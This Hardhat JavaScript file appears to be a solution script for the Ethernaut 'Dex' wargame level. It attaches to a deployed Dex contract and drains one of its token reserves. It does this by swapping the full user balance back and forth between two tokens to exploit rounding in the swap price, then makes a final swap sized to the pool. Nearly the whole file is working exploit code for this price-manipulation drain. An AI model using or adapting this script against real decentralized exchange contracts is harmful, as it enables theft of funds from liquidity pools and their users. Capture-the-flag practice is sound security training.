const { ethers } = require("hardhat");
const hre = require("hardhat");
async function main() {
    
    //Params
    levelAddress = "0x5D491EACd04DE0dF5a4193f58F549212Bb86985d";
    contractName = "Dex";

    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${account.address}`);
    const Level = await hre.ethers.getContractFactory(contractName);
    const level = await Level.attach(levelAddress);
    // const level = await Level.deploy();
    console.log(`Level at address ${level.address}`);
    // const Attacker = await hre.ethers.getContractFactory(`Attacker${contractName}`);
    // const attacker = await Attacker.deploy(level.address);
    // console.log(`Attacker at ${attacker.address}`);
    let token1address = await level.token1();
    let token2address = await level.token2();
    const token1 = await hre.ethers.getContractAt("IERC20",token1address);
    const token2 = await hre.ethers.getContractAt("IERC20",token2address);
    
    console.log(`Token1 at address ${token1.address}`);
    console.log(`Token2 at address ${token2.address}`);


    let balanceDexToken1 = await token1.balanceOf(level.address);
    let balanceDexToken2 = await token2.balanceOf(level.address);
    let balanceUserToken1 = await token1.balanceOf(account.address);
    let balanceUserToken2 = await token2.balanceOf(account.address);
    let id_token_to_change = balanceUserToken1 > 0 ? 1:2;

    // tx = await level.approve(level.address,5000);
    // tr = await tx.wait();

    // // tx = await token1.approve(level.address,1000);
    // // tr = await tx.wait();
    // allowance = await token1.allowance(account.address,level.address);
    // console.log(`Allowance ${allowance}`);
    // allowance = await token1.allowance(account.address,account.address);
    // console.log(`Allowance ${allowance}`);
    // // tx = await token1.transferFrom(level.address,account.address,110);
    // // tr = await tx.wait();
    // balanceDexToken1 = await token1.balanceOf(level.address);
    // allowance = await token1.allowance(level.address,account.address);
    // console.log(`Allowance ${allowance}`);
    // allowance = await token2.allowance(level.address,account.address);
    // console.log(`Allowance ${allowance}`);
    // console.log(balanceDexToken1);

    while (balanceDexToken1 > 0 && balanceDexToken2 > 0){
        if (id_token_to_change==1){
            amount = balanceUserToken1;
            swap_out = await level.get_swap_price(token1.address,token2.address,amount);
            if (swap_out.gt(balanceDexToken2)){
                console.log(`Break with swap_out = ${swap_out} and balanceDexToken2 = ${balanceDexToken2}`);
                break;
            }
            tx = await level.swap(token1.address,token2.address,amount);
            tr = await tx.wait();
            id_token_to_change = 2;
        }
        else if (id_token_to_change==2){
            amount = balanceUserToken2;
            swap_out = await level.get_swap_price(token2.address,token1.address,amount);
            if (swap_out.gt(balanceDexToken1)){
                console.log(`Break with swap_out = ${swap_out} and balanceDexToken1 = ${balanceDexToken2}`);
                break;
            }
            tx = await level.swap(token2.address,token1.address,amount);
            tr = await tx.wait();
            id_token_to_change = 1;
        }

        balanceDexToken1 = await token1.balanceOf(level.address);
        balanceDexToken2 = await token2.balanceOf(level.address);
        balanceUserToken1 = await token1.balanceOf(account.address);
        balanceUserToken2 = await token2.balanceOf(account.address);
        console.log("\n\nTRANSACTION");
        console.log(`BalanceDexToken1 ${balanceDexToken1}`);
        console.log(`BalanceDexToken2 ${balanceDexToken2}`);
        console.log(`BalanceUserToken1 ${balanceUserToken1}`);
        console.log(`BalanceUserToken2 ${balanceUserToken2}`);
    }
    

    balanceDexToken1 = await token1.balanceOf(level.address);
    balanceDexToken2 = await token2.balanceOf(level.address);
    balanceUserToken1 = await token1.balanceOf(account.address);
    balanceUserToken2 = await token2.balanceOf(account.address);

    console.log(`BalanceDexToken1 ${balanceDexToken1}`);
    console.log(`BalanceDexToken2 ${balanceDexToken2}`);
    console.log(`BalanceUserToken1 ${balanceUserToken1}`);
    console.log(`BalanceUserToken2 ${balanceUserToken2}`);

    console.log("Swapping for the lasts tokens");
    if (id_token_to_change==1){
            amount = balanceDexToken1;
            swap_out = await level.get_swap_price(token1.address,token2.address,amount);
            if (swap_out.gt(balanceDexToken2)){
                console.log(`Break with swap_out = ${swap_out} and balanceDexToken2 = ${balanceDexToken2}`);
            }
            tx = await level.swap(token1.address,token2.address,amount);
            tr = await tx.wait();
            id_token_to_change = 2;
        }

    else if (id_token_to_change==2){
        amount = balanceDexToken2;
        swap_out = await level.get_swap_price(token2.address,token1.address,amount);
        if (swap_out.gt(balanceDexToken1)){
            console.log(`Break with swap_out = ${swap_out} and balanceDexToken1 = ${balanceDexToken2}`);
        }
        tx = await level.swap(token2.address,token1.address,amount);
        tr = await tx.wait();
        id_token_to_change = 1;
    }

    balanceDexToken1 = await token1.balanceOf(level.address);
    balanceDexToken2 = await token2.balanceOf(level.address);
    balanceUserToken1 = await token1.balanceOf(account.address);
    balanceUserToken2 = await token2.balanceOf(account.address);

    console.log(`BalanceDexToken1 ${balanceDexToken1}`);
    console.log(`BalanceDexToken2 ${balanceDexToken2}`);
    console.log(`BalanceUserToken1 ${balanceUserToken1}`);
    console.log(`BalanceUserToken2 ${balanceUserToken2}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
